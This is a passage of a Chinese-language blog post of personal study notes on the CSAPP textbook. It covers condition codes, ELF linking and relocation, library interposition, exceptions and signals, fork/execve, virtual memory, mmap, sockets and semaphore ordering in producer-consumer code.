        <content type="html"><![CDATA[<p>CSAPP阅读笔记</p><span id="more"></span><p>文章仅作为笔者复习参考,其中内容仅为笔者当前阶段学习CSAPP的理解,不保证正确性.</p><h1 id="第三章-程序的机器级表示"><a href="#第三章-程序的机器级表示" class="headerlink" title="第三章 程序的机器级表示"></a>第三章 程序的机器级表示</h1><h3 id="3-6-1条件码"><a href="#3-6-1条件码" class="headerlink" title="3.6.1条件码:"></a>3.6.1条件码:</h3><p>CF:进位标志.最近的操作使最高位产生了进位.<br>ZF:零标志.最近操作的结果为0.<br>SF:符号标志.最近的操作得到负数.<br>OF:溢出标志.最近的操作导致一个补码溢出<br>PF:奇偶标志位.最近操作的结果所有bit中1为偶数<br>AF:辅助进位标志位 运算过程中看最后四位,不论长度为多少 最后四位向前有进位或者借位,AF=1,否则AF=0<br>TF:调试标志位 当TF=1时,处理器每次只执行一条指令,即单步执行<br>IF:中断允许标志位 它用来控制8086是否允许接收外部中断请求 若IF=1,8086能响应外部中断,反之则屏蔽外部中断<br>DF:方向标志位 在串处理指令中,每次操作后,如果DF=0,si di递增,如果DF=1,si di递减;注意此处DF的值是由程序员进行设定的 cld命令是将DF设置为0,std命令是将DF设置为1<br>进位标志表示无符号数运算结果是否超出范围，运算结果仍然正确；<br>溢出标志表示有符号数运算结果是否超出范围，运算结果已经不正确。<br>leaq指令不改变任何条件码.对于逻辑操作,进位标志和溢出标志会设置成0.对于移作,进位标志将设置为最后一个被移出的位,溢出标志设置为0.INC和DEC指令仅设出和零标志.</p><h1 id="第七章-链接"><a href="#第七章-链接" class="headerlink" title="第七章 链接"></a>第七章 链接</h1><h2 id="7-3目标文件"><a href="#7-3目标文件" class="headerlink" title="7.3目标文件"></a>7.3目标文件</h2><ol><li>可重定位目标文件:由编译器和汇编器产生,包含从地址0开始的代码和数据节</li><li>可执行目标文件:可直接复制到内存并执行</li><li>共享目标文件:特殊类型的可重定位目标文件,可以在加载或者运行时被动态地加载进内存并链接.</li></ol><h2 id="7-5-符号和符号表"><a href="#7-5-符号和符号表" class="headerlink" title="7.5 符号和符号表"></a>7.5 符号和符号表</h2><p>static属性的C函数和全局变量为局部符号,仅为定义该符号的模块(源文件)所私有,其他模块无法通过extern声明使用.用static来保护变量和函数是良好的编程习惯.</p><h3 id="符号表条目"><a href="#符号表条目" class="headerlink" title="符号表条目"></a>符号表条目</h3><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> name<span class="token punctuation">;</span>    <span class="token keyword">char</span> type<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">,</span>            binding<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> reserved<span class="token punctuation">;</span>    <span class="token keyword">short</span> section<span class="token punctuation">;</span>    <span class="token keyword">long</span> value<span class="token punctuation">;</span>    <span class="token keyword">long</span> size<span class="token punctuation">;</span><span class="token punctuation">}</span>Elf64_Symbol<span class="token punctuation">;</span></code></pre><p>name是字符串表(.strtab)中对应符号的字节偏移,type是数据或函数.binding指示符号是本地还是全局.value是距定义目标的节的起始位置的偏移(相对地址,<code>对于可执行目标文件来说,该值是一个绝对运行时地址</code>.<del>不是很理解呢?</del>)<br>每个符号被分配到目标文件的某个节,由section表示.<br>有三个特殊的伪节(仅存在于可重定位目标文件中):<br>    1.ABS 不该被重定位的符号<br>    2.UNDEF 未定义的符号<br>    3.COMMON 未初始化的全局变量<br>区别于COMMON节,bss分配未初始化的静态变量,以及初始化为0的全局或静态变量.</p><h2 id="7-6符号解析"><a href="#7-6符号解析" class="headerlink" title="7.6符号解析"></a>7.6符号解析</h2><p>将每个引用于它输入的可重定位目标文件的符号表中的一个确定符号定义关联</p><h3 id="7-6-1-多重定义的全局符号"><a href="#7-6-1-多重定义的全局符号" class="headerlink" title="7.6.1 多重定义的全局符号"></a>7.6.1 多重定义的全局符号</h3><p>函数和已初始化的全局变量是强符号,未初始化的全局变量是弱符号.<br>规则1:不允许多个同名的强符号<br>规则2:如果一个强符号和多个弱符号同名,选强符号<br>规则3:如果多个弱符号同名,则任意选择一个</p><p>该规则下会造成一些不易察觉的运行时错误.使用GCC-fno_common标志指示链接器不允许多重定义全局符号.</p><h3 id="7-6-2-与静态库链接"><a href="#7-6-2-与静态库链接" class="headerlink" title="7.6.2 与静态库链接"></a>7.6.2 与静态库链接</h3><h4 id="为什么要支持库的概念"><a href="#为什么要支持库的概念" class="headerlink" title="为什么要支持库的概念"></a>为什么要支持库的概念</h4><p>方案一:让编译器辨认出对标准函数的调用,并生成相应代码.<br>缺点:编译器过于复杂,每次增删改一个标准函数,就需要一个新版本编译器<br>方案二:将所有标准函数放在一个可重定位目标文件libc.o中<br>缺点:内存占用大,更新编译时间长<br>方案三:相关函数编译为独立的目标模块(静态库),链接时只复制被程序引用的目标模块.</p><h4 id="静态库实现"><a href="#静态库实现" class="headerlink" title="静态库实现"></a>静态库实现</h4><p>Linux以存档(archive)的特殊文件格式存储静态库.存档文件时一组连接起来的可重定位目标文件的集合,有一个头部用来描述每个成员目标文件的大小和位置(.a)</p><h3 id="7-6-3-链接器解析引用"><a href="#7-6-3-链接器解析引用" class="headerlink" title="7.6.3 链接器解析引用"></a>7.6.3 链接器解析引用</h3><p>在符号解析阶段,链接器从左到右按照静态库在命令行中出现的顺序扫描可重定位目标文件和存档文件(自动将.c翻译为.o).在这次扫描中,链接器维护一个可重定位文件的集合E(这个集合中的文件会被合并起来形成可执行文件),一个未解析的符号(引用了但未定义)集合U,一个在前面输入文件中已定义的符号集合D.初始时EUD均为空。<br>对于命令行中每一个输入文件f,若为目标文件,则把f添加到E,修改U和D反应f中的符号定义和引用.若为存档文件,遍历目录尝试寻找可重定位目标文件m匹配U中的未定义符号,将m添加到E中,修改U和D反应f中的符号定义和引用,直到U和D不再发生变化.此时不在E中的目标文件都被简单的丢弃.<br>若完成所有f的扫描后,U是非空的,则报错.否则就合并和重定位E中的目标文件,构建输出的可执行文件.<br>这样的算法决定了链接时文件需要排序.</p><h2 id="7-7-重定位"><a href="#7-7-重定位" class="headerlink" title="7.7 重定位"></a>7.7 重定位</h2><p>重定位将合并输入模块,为每个符号分配运行时地址.<br>重定位由两步组成:<br>    1.重定位节和符号定义.链接器将所有相同类型的节合并为同一类型的聚合节.然后将运行时的内存地址赋给新的聚合节,赋给输入模块定义的每个节,赋给输入模块定义的每个符号<br>    2.重定位节中的符号引用.依赖重定位条目,修改对每个符号的引用,使得它们指向正确的运行时地址.</p><h3 id="7-7-1-重定位条目"><a href="#7-7-1-重定位条目" class="headerlink" title="7.7.1 重定位条目"></a>7.7.1 重定位条目</h3><p>汇编器对最终位置未知的目标引用,生成一个重定位条目,指示链接器在合并时如何修改这个引用.代码的重定位条目放在.rel.text中,已初始化数据的重定位条目放在.rel.data中.</p><pre class=" language-c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">long</span> offset<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//符号引用距该节的字节偏移(节偏移)</span>    <span class="token keyword">long</span> type<span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">//指示如何修改引用</span>            symbol<span class="token punctuation">:</span><span class="token number">32</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//符号表中的index</span>    <span class="token keyword">long</span> addend<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//有符号常数,指示对地址做偏移调整</span><span class="token punctuation">}</span>Elf64_Rela</code></pre><p>链接器在每个节以及每个与该节相关联的重定位条目上迭代执行,根据不同重定位类型对修改引用为运行时地址相关数据.(绝对寻址、PC相对寻址…)</p><h2 id="7-10-动态链接库"><a href="#7-10-动态链接库" class="headerlink" title="7.10 动态链接库"></a>7.10 动态链接库</h2><h3 id="静态库的缺点"><a href="#静态库的缺点" class="headerlink" title="静态库的缺点"></a>静态库的缺点</h3><p>若静态库更新,必须显示的将程序与新的静态库重新链接.<br>且对一些大量使用的函数,这些函数的代码将会被复制到每个运行进程的文本段中,浪费内存.</p><h3 id="共享库"><a href="#共享库" class="headerlink" title="共享库"></a>共享库</h3><p>共享库(共享目标)是一个目标模块,在运行和加载时加载到相应内存地址,并和一个在内存中的程序链接起来.这一动态链接的过程由一个叫动态链接器的程序执行.在Linux中使用.so后缀,在微软操作系统中被称为DLL.<br>一个共享库的.text节的一个副本可以被不同的正在运行时的进程共享.</p><h2 id="7-11-从应用程序中加载和链接共享库"><a href="#7-11-从应用程序中加载和链接共享库" class="headerlink" title="7.11 从应用程序中加载和链接共享库"></a>7.11 从应用程序中加载和链接共享库</h2><p>dlopen,dlsym,dlerror.</p><h2 id="7-12-位置无关代码-fpic"><a href="#7-12-位置无关代码-fpic" class="headerlink" title="7.12 位置无关代码 -fpic"></a>7.12 位置无关代码 -fpic</h2><p>将共享库加载到内存的任意位置</p><h3 id="PIC数据引用"><a href="#PIC数据引用" class="headerlink" title="PIC数据引用"></a>PIC数据引用</h3><p>无论在任意地址加载一个目标模块,数据段与代码段距离保持不变.<br>编译器在数据段开始的地方创建GOT表,加载时动态链接器会重定位GOT表中的每个条目,使得它包含目标的绝对地址.<br>程序运行时,指令通过固定偏移访问对应GOT表并取出绝对地址,完成数据引用的解析.</p><h3 id="PIC函数调用"><a href="#PIC函数调用" class="headerlink" title="PIC函数调用"></a>PIC函数调用</h3><p>详见ret2dl_resolve.</p><h2 id="7-13-库打桩机制"><a href="#7-13-库打桩机制" class="headerlink" title="7.13 库打桩机制"></a>7.13 库打桩机制</h2><p>基本思想:给定一个需要打桩的目标函数,创建一个包装函数,它的院线和目标函数完全一样,使用某种特殊的打桩机制,欺骗系统调用目标函数,再将目标函数的返回值传递给调用者.</p><h3 id="7-13-1-编译时打桩"><a href="#7-13-1-编译时打桩" class="headerlink" title="7.13.1 编译时打桩"></a>7.13.1 编译时打桩</h3><p>更改可重定位目标文件路径.</p><h3 id="7-13-2-链接时打桩"><a href="#7-13-2-链接时打桩" class="headerlink" title="7.13.2 链接时打桩"></a>7.13.2 链接时打桩</h3><p>Linux静态链接器支持使用–wrap f标志打桩,将对f的引用解析成__wrap_f,把对__real_f的引用解析为f<br>gcc -Wl,–wrap,malloc</p><h3 id="7-13-3-运行时打桩"><a href="#7-13-3-运行时打桩" class="headerlink" title="7.13.3 运行时打桩"></a>7.13.3 运行时打桩</h3><p>修改动态链接器的LD_PRELOAD环境变量</p><h1 id="第八章-异常控制流"><a href="#第八章-异常控制流" class="headerlink" title="第八章 异常控制流"></a>第八章 异常控制流</h1><h2 id="8-1-异常"><a href="#8-1-异常" class="headerlink" title="8.1 异常"></a>8.1 异常</h2><p>处理器状态变化称为事件.<br>在任何情况下,当处理器检测到事件发生,它通过一张由异常表基址寄存器寻址的跳转表(即异常表),进行一个间接过程调用,到一个专门设计用来处理这类实践的操作系统子程序_——异常处理程序.</p><h3 id="8-1-1-异常处理"><a href="#8-1-1-异常处理" class="headerlink" title="8.1.1 异常处理"></a>8.1.1 异常处理</h3><p>系统中每种可能类型的异常都分配有一个非负整数的异常号,部分由处理器定义(被零除、缺页、内存访问违例、断点以及算术运算溢出),其他由操作系统内核定义(系统调用,外部IO信号)</p><p>当系统启动(计算机重启或加电)时,操作系统分配和初始化一张名为异常表的跳转表,当异常发生,处理器通过异常表基址n和异常号k,调用n+4*k地址存放的异常处理函数指针.</p><p>异常处理程序运行在内核模式下,对所有的系统资源有完全的访问权限.<br>当控制从用户程序转移到内核,所有的状态信息将压入内核栈中.</p><p>ps:linux系统调用使用的跳转表并非异常表,但也需要通过0x80号异常先进入异常处理程序再进一步跳转.</p><h3 id="8-1-2-异常的类别"><a href="#8-1-2-异常的类别" class="headerlink" title="8.1.2 异常的类别"></a>8.1.2 异常的类别</h3><ol><li>中断:处理器外部IO设备信号</li><li>陷阱和系统调用:执行一条指令产生的有意旳异常,在用户程序和内核之间提供一个接口,即系统调用.</li><li>故障:由错误情况引起,可能被故障处理程序修正,若成功修正就重新执行引起故障的指令,否则返回到abort例程终止程序.(如缺页,以及linux中的段错误,但linux并不会尝试恢复这个错误.)</li><li>终止:不可恢复的致命错误,返回到abort例程终止应用程序.</li></ol><h2 id="8-2-进程"><a href="#8-2-进程" class="headerlink" title="8.2 进程"></a>8.2 进程</h2><p>进程是一个执行中程序的实例.系统中每个程序都运行在某个进程的上下文中.</p><h3 id="8-2-4-用户模式和内核模式"><a href="#8-2-4-用户模式和内核模式" class="headerlink" title="8.2.4 用户模式和内核模式"></a>8.2.4 用户模式和内核模式</h3><p>处理器用某个控制寄存器的一个模式位来标识运行模式.<br>linux提供/proc文件系统,允许用户模式进程访问内核数据结构内容.</p><h4 id="x2F-proc文件系统-待补充"><a href="#x2F-proc文件系统-待补充" class="headerlink" title="/proc文件系统 待补充"></a>/proc文件系统 待补充</h4><h3 id="8-2-5-上下文切换"><a href="#8-2-5-上下文切换" class="headerlink" title="8.2.5 上下文切换"></a>8.2.5 上下文切换</h3><p>内核为每个进程维持一个上下文.上下文是内核重新启动一个被抢占的进程所需的状态.也是程序正确运行所必须的状态.<br>在进程的某些时刻,内核可以决定抢占当前进程,并重新开始一个先前被抢占的进程.这种决策叫做调度,由内核中称为调度器的代码处理.</p><h2 id="8-3-系统调用错误处理"><a href="#8-3-系统调用错误处理" class="headerlink" title="8.3 系统调用错误处理"></a>8.3 系统调用错误处理</h2><p>当系统级函数遇到错误时,通常会设置全局整型变量errno,可以通过错误报告函数(输出错误信息,处理错误或退出程序)以及错误处理包装函数(将可能发生错误的函数和错误处理函数封装到一起)来处理错误同时防止代码臃肿.</p><h2 id="8-4-进程控制"><a href="#8-4-进程控制" class="headerlink" title="8.4 进程控制"></a>8.4 进程控制</h2><h3 id="8-4-3-回收子进程"><a href="#8-4-3-回收子进程" class="headerlink" title="8.4.3 回收子进程"></a>8.4.3 回收子进程</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305050013956.png"></p><h3 id="8-4-5加载并运行程序"><a href="#8-4-5加载并运行程序" class="headerlink" title="8.4.5加载并运行程序"></a>8.4.5加载并运行程序</h3><p>execve函数在当前进程的上下文中加载并运行一个新程序</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt; unistd.h></span></span><span class="token keyword">int</span> <span class="token function">execve</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> filename<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>execve函数调用一次且只在发生错误(如找不到filename对应文件)才返回到调用程序.<br>argv变量指向一个以null结尾的指针数组,每个指针指向一个参数字符串,argv[0]为可执行目标文件的名字.envp指向一个以null结尾的指针数组,每个指针指向一个环境变量字符串,每个串都是形如”name=value”的名字-值对.<br>在execve加载了filename后,调用启动代码,将控制传递给新程序的主函数.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305050022890.png"></p><h3 id="程序与进程"><a href="#程序与进程" class="headerlink" title="程序与进程"></a>程序与进程</h3><p>程序是一堆代码和数据,可以作为目标文件存在于磁盘上,或者作为段存在于地址空间中.进程时执行中程序的一个实例.</p><h3 id="利用fork和execve运行程序"><a href="#利用fork和execve运行程序" class="headerlink" title="利用fork和execve运行程序"></a>利用fork和execve运行程序</h3><h2 id="8-5-信号-重点且内容多-翻书查阅"><a href="#8-5-信号-重点且内容多-翻书查阅" class="headerlink" title="8.5 信号 (重点且内容多,翻书查阅)"></a>8.5 信号 (重点且内容多,翻书查阅)</h2><p>信号是更高层的软件形式的异常,低层的硬件异常是由内核异常处理程序处理的,正常情况下对用户进程不可见.信号提供一种机制,通知用户进程发生了这些异常.</p><h3 id="8-5-1-信号术语"><a href="#8-5-1-信号术语" class="headerlink" title="8.5.1 信号术语"></a>8.5.1 信号术语</h3><p>接收信号:当目的进程被内核强迫以某种方式对信号作出反应时,它就接收了信号.一个发出而没有被接收的信号叫待处理信号.在任何时刻,一种类型至多只会有一个待处理信号.如果一个进程由有一个类型为k的待处理信号,那么任何接下来发送到这个进程的类型k的信号都不会排队等待,而是被直接丢弃.(如果当前进程正在执行k的信号处理程序,此时再次收到信号k,该信号会排队等待而不是丢弃)<br>实时信号将不会被丢弃,而是多次注册.</p><p>捕获信号:调用信号处理程序<br>处理信号:执行信号处理程序</p><p>进程只有处理完信号才会返回用户态，进程在用户态下不会有未处理完的信号.<br>如果进程收到一个要捕捉的信号，那么进程从内核态返回用户态时执行用户定义的函数。而且执行用户定义的函数的方法很巧妙，内核是在用户栈上创建一个新的层，该层中将返回地址的值设置成用户定义的处理函数的地址，这样进程从内核返回弹出栈顶时就返回到用户定义的函数处，从函数返回再弹出栈顶时，才返回原先进入内核的地方。这样做的原因是用户定义的处理函数不能且不允许在内核态下执行(如果用户定义的函数在内核态下运行的话，用户就可以获得任何权限)</p><h2 id="8-6-非本地跳转"><a href="#8-6-非本地跳转" class="headerlink" title="8.6 非本地跳转"></a>8.6 非本地跳转</h2><p>setjmp(jmp_buf env),sigsetjmp(sigjmp_buf env,int savesigs)在参数env中保存当前调用环境.调用时返回0.且任何情形下返回值不能赋给变量.<br>(sigsetjmp保存的环境还包括信号的上下文:待处理的和被阻塞的信号向量)</p><p>longjmp(jmp_buf env,int retval)函数从env中恢复最近一次初始化该env的setjmp调用保存的环境,然后从setjmp返回,并带有非零的返回值retval.</p><p>也就是说,setjmp调用一次返回多次,longjmp调用一次,但从不返回.</p><p>非本地跳转的一个重要应用就是允许从一个深层嵌套的函数调用中立即返回.(比如检测到错误后立即跳转到错误处理程序而不是费力地解开调用栈.)</p><p>C++和Java地异常机制是较高层次的.catch类似于setjmp,throw类似于longjmp.</p><h1 id="第九章-虚拟内存"><a href="#第九章-虚拟内存" class="headerlink" title="第九章 虚拟内存"></a>第九章 虚拟内存</h1><h2 id="9-1-物理和虚拟寻址"><a href="#9-1-物理和虚拟寻址" class="headerlink" title="9.1 物理和虚拟寻址"></a>9.1 物理和虚拟寻址</h2><p>使用虚拟寻址,CPU通过生成一个虚拟地址(VA)来访问主存,该虚拟地址被CPU上芯片上的内存管理单元(利用存放在主存中的页表)翻译为物理地址.</p><h2 id="9-3-虚拟内存作为缓存的工具"><a href="#9-3-虚拟内存作为缓存的工具" class="headerlink" title="9.3 虚拟内存作为缓存的工具"></a>9.3 虚拟内存作为缓存的工具</h2><p>VM系统将虚拟内存分割为虚拟页(VP)作为主存和磁盘之间的传输单元.类似的,物理内存被分割为物理页(PP),大小与VP相同.物理页也被称为页帧(page frame)<br>在任意时刻虚拟页面的集合都分为三个不相交的子集:</p><ol><li>未分配的:VM还未分配或创建的页.未分配的页没有任何数据和它们相关联,因此也就不占用任何磁盘空间.</li><li>缓存的:当前已缓存在物理内存中的已分配页</li><li>未缓存的:未缓存在物理内存中的已分配页(即只存在于磁盘上)</li></ol><h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>虚拟内存系统必须有某种方法判定一个虚拟页是否缓存在DRAM中的某个地方.如果是,系统还必须确定这个虚拟页存放在哪个物理页中.如果不命中,系统必须判断这个虚拟页存放在磁盘的哪个位置.在物理内存中选择一个牺牲页,并将虚拟页从磁盘复制到DRAM中,替换这个牺牲页.</p><p>页表存放在物理内存中,将虚拟页映射到物理页.每次地址翻译时都会读取页表.操作系统负责维护页表内容,以及在磁盘与DRAM之间来回传送页.<br>页表是一个页表条目(PTE)的数组.虚拟地址空间的每个页在页表中一个固定偏移量处都有一个PTE.</p><p>简化后的页表示意图:<br>将每个PTE简化为一个有效位和一个n位地址字段.<br>若有效位为1,说明该条目对应的虚拟页缓存在物理内存中,地址字段保存该物理页的物理页号.<br>若有效位为0,说明该条目对应虚拟页未缓存.地址字段表示该虚拟页对应的磁盘地址,若为空表示该虚拟页还未分配.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191358796.jpg"></p><h3 id="缺页"><a href="#缺页" class="headerlink" title="缺页"></a>缺页</h3><p>DRAM缓存不命中称为缺页.<br>缺页后触发缺页异常,调用内核中的缺页异常处理程序,选择一个牺牲页进行替换(页面调度)并修改页表.若该牺牲页已经被修改过了,那么内核会将它复制回磁盘.<br>(言外之意就是,其实物理内存中的已经缓存的页在磁盘中也有一个副本,要是没修改过就不用更新,不过已分配页的磁盘地址保存在哪?)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191403569.jpg"></p><h3 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h3><p>局部性原则保证了在任意时刻,程序趋向于在一个较小的活动页面集合上工作,这个集合叫做工作集或者常驻集合.如果工作集的大小超出了物理内存的大小,就产生”抖动”.</p><h2 id="9-6-地址翻译"><a href="#9-6-地址翻译" class="headerlink" title="9.6 地址翻译"></a>9.6 地址翻译</h2><p>口述一遍这个图的流程,每个流程是怎么实现的以及每一个流程的目的,为什么能加快速度或节约物理内存,地址翻译也就差不多搞清楚了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191759005.jpg"></p><h2 id="9-8-内存映射"><a href="#9-8-内存映射" class="headerlink" title="9.8 内存映射"></a>9.8 内存映射</h2><h3 id="内存映射与对象"><a href="#内存映射与对象" class="headerlink" title="内存映射与对象"></a>内存映射与对象</h3><p>Linux通过将一个虚拟内存区域与一个磁盘上的对象关联起来,以初始化这个虚拟内存区域的内容,这个过程称为写时映射.(对象分为普通文件和匿名文件)<br>如果一个进程将一个共享对象映射到它的虚拟地址空间的一个区域内,那么这个进程对这个区域的任何些操作,对于任何映射了这个共享对象的其他进程也是可见的.而且这些变化也会反映在磁盘上的原始对象中.<br>对于一个映射到私有对象的区域所作的改变,对其他进程来说是不可见的.并且进程对这个区域做的所有操作都不会反映在磁盘的对象中.(对这一点的理解,比如pwn题你改了bss段的数据,可执行文件改变了吗?)</p><p>当两个进程将同一个私有对象映射到虚拟内存中时,共享这个对象的同一个物理副本.该区域在每个进程的页表条目中都被标记为只读.当一个进程试图写这个区域时触发缺页异常,异常处理程序发现该异常是由于对<code>"私有的写时复制区域中的一个页面"</code>的写造成的,就会在物理内存中创建这个页面的一个新副本,更新该进程的页表条目指向这个新副本,恢复该页面的可写权限.</p><h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>当fork被进程调用,内核为新进程创建各种数据结构.创建了当前进程的mm_struct、区域结构和页表的原样副本,并将两个进程中的每个页面都标记为只读,每个区域结构都标记为私有的写时复制.(父子进程私有地址空间的原理)</p><blockquote><p>提问:既然都标为只读和私有的写时复制了,那父子进程都进行写操作后,不久存三个物理副本了?这不是浪费吗…<br>答:”进程对私有对象的区域所作的改变不会反映在磁盘对象中”,也就是说就算你只有一个进程,进行写的时候也会产生副本,因为改变不能反映在磁盘对象中</p></blockquote><h3 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h3><p>从内存映射的视角再看execve做了些什么.</p><pre class=" language-cpp"><code class="language-cpp"><span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"a.out"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><ol><li>删除已存在的用户区域,删除当前进程虚拟地址的用户部分中的已存在的区域结构</li><li>映射私有区域,为新程序的代码、数据、bss和栈区域创建新的数据结构.代码和数据区域被映射为可执行文件中的.text和.data区,bss段是请求二进制零的,映射到匿名文件.(这里可以与C/C++中的变量存储联系起来,什么样的变量会存到bss段?未初始化的静态变量和初始化为0的全局(或静态)变量)</li><li>映射共享区域.libc.so之类的.</li><li>设置程序计数器(PC),指向代码区域的入口点.<br>当然这只是完成了映射,当开始执行时,才调度页面进入主存.</li></ol><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>Linux进程可以使用mmap创建新的虚拟内存区域,并将对象映到这些区域中.</p><pre class=" language-cpp"><code class="language-cpp"><span class="token keyword">void</span><span class="token operator">*</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> start<span class="token punctuation">,</span>size_t lenth<span class="token punctuation">,</span><span class="token keyword">int</span> prot<span class="token punctuation">,</span><span class="token keyword">int</span> flags<span class="token punctuation">,</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span>off_t offset<span class="token punctuation">)</span><span class="token comment" spellcheck="true">//start:新区域的起始地址</span><span class="token comment" spellcheck="true">//prot:权限</span><span class="token comment" spellcheck="true">//flags:对象类型,MAP_ANON,MAP_SHARED,MAP_PRIVATE</span><span class="token comment" spellcheck="true">//fd:文件描述符(回想一下内存映射的对象就是文件)</span><span class="token comment" spellcheck="true">//offset:映射开始位置相对文件起始位置的偏移量</span><span class="token keyword">int</span> <span class="token function">munmap</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> start<span class="token punctuation">,</span>size_t lenth<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="9-9-动态内存分配"><a href="#9-9-动态内存分配" class="headerlink" title="9.9 动态内存分配"></a>9.9 动态内存分配</h2><h3 id="9-9-3-分配器的要求和目标"><a href="#9-9-3-分配器的要求和目标" class="headerlink" title="9.9.3 分配器的要求和目标"></a>9.9.3 分配器的要求和目标</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><ol><li>处理任意请求序列</li><li>立即响应请求</li><li>只使用堆</li><li>对齐块</li><li>不修改已分配的块</li></ol><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><ol><li>最大化吞吐率</li><li>最大化内存利用率</li></ol><h3 id="9-9-5-实现问题"><a href="#9-9-5-实现问题" class="headerlink" title="9.9.5 实现问题"></a>9.9.5 实现问题</h3><p>空闲块组织:如何记录空闲块<br>放置:如何选择合适的空闲块来放置新分配的块<br>分割:在一个新分配的块放置到某个空闲块之后,我们如何处理这个空闲块中的剩余部分?<br>合并:如何处理一个刚刚释放的块(如何处理内存中连续的多个空闲块)</p><h1 id="第十一章-网络编程"><a href="#第十一章-网络编程" class="headerlink" title="第十一章 网络编程"></a>第十一章 网络编程</h1><h2 id="11-1-客户端-服务器编程模型"><a href="#11-1-客户端-服务器编程模型" class="headerlink" title="11.1 客户端-服务器编程模型"></a>11.1 客户端-服务器编程模型</h2><p>每个网络应用都是基于客户端-服务器模型的.该模型的基本操作是事物.<br>一个事物由四步组成:</p><ol><li>客户端向服务器发送请求</li><li>服务器接收、解释请求,以适当的方式操作它的资源.</li><li>服务器给客户端发送一个响应,等待下一个请求.</li><li>客户端收到响应并处理它.</li></ol><h2 id="11-3"><a href="#11-3" class="headerlink" title="11.3"></a>11.3</h2><p>数据可以同时双向流动,它是全双工的.<br>一个套接字是连接的一个断点.每个套接字都有相应的套接字地址.当客户端发起一个连接请求,客户端套接字地址的端口是由内核自动分配的,称为临时端口.<br>一个连接是由它两端的套接字地址唯一确定的.这对套接字地址叫做套接字对.<br>(cliaddr:cliport,servaddr:servport)</p><h1 id="第十二章-并发编程"><a href="#第十二章-并发编程" class="headerlink" title="第十二章 并发编程"></a>第十二章 并发编程</h1><p>互斥（mutualexclusion）:保证一个线程在临界区执行时，其他线程应该被阻止进入临界区.互斥也并不是只针对多线程。在多进程竞争共享资源的时候，也同样是可以使用互斥的方式来避免资源竞争造成的资源混乱。<br>同步，就是并发进程/线程在一些关键点上可能需要互相等待与互通消息，这种相互制约的等待与互通信息称为进程/线程同步。<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306261127339.png"></p><p>互斥一般用锁来实现,同步用信号量来实现.信号量同时也可以用作互斥锁.</p><h2 id="12-5-用信号量同步线程"><a href="#12-5-用信号量同步线程" class="headerlink" title="12.5 用信号量同步线程"></a>12.5 用信号量同步线程</h2><h3 id="12-5-4-利用信号量来调度共享资源"><a href="#12-5-4-利用信号量来调度共享资源" class="headerlink" title="12.5.4 利用信号量来调度共享资源"></a>12.5.4 利用信号量来调度共享资源</h3><h4 id="生产者-消费者问题"><a href="#生产者-消费者问题" class="headerlink" title="生产者-消费者问题"></a>生产者-消费者问题</h4><h5 id="CSAPP实例程序中多个P-V操作的顺序问题"><a href="#CSAPP实例程序中多个P-V操作的顺序问题" class="headerlink" title="CSAPP实例程序中多个P,V操作的顺序问题"></a>CSAPP实例程序中多个P,V操作的顺序问题</h5><p>P的顺序是不可交换的,一定是先P可用槽数量或可用数据的信号量,再P互斥锁.否则当互斥锁上锁之后再发现无可用槽或数据,该线程阻塞,而此时对应的生产者/消费者线程由于无法互斥锁上锁同样阻塞,形成死锁.也就是说,互斥锁的上锁一定是在判断完其他条件之后,在正式访问、更改数据之前的最后一个操作.</p><p>V的顺序是可交换的,但类似示例程序的情形还是推荐先解锁.对于该次Insert后槽已填满的情况,V(slots)的行为的速度对其他线程并无影响.但互斥锁会阻塞消费者读取数据.所以先解锁再V(slots)可以加快消费者的速度,尽量减少槽被填满后下次生产者的阻塞.</p><h4 id="读者写者问题"><a href="#读者写者问题" class="headerlink" title="读者写者问题"></a>读者写者问题</h4><blockquote><pre><code>「读-读」允许：同一时刻，允许多个读者同时读「读-写」互斥：没有写者时读者才能读，没有读者时写者才能写「写-写」互斥：没有其他写者时，写者才能写</code></pre></blockquote><h4 id="生产者消费者区别和读者写者问题的区别"><a href="#生产者消费者区别和读者写者问题的区别" 